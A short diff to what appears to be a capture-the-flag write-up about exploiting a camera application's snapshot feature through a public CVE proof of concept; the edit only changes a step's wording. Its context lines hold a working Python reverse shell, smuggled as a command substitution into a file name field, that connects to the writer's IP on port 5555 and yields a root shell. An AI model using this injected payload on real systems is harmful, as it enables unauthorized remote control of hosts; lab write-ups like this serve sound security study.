@@ -396,7 +396,7 @@ Looking at the [exploit](https://www.exploit-db.com/exploits/52481) poc of [cve-
 - Open the side bar > still images
 	- File name: `$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.87",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")').%Y-%m-%d-%H-%M-%S`
 		- This will send a revshell connection to my ip
-- hover over the camera and take a manual snapshop
+- click on the camera and take a manual snapshop
 
 AAAAND that’s it folks. root acces.
 
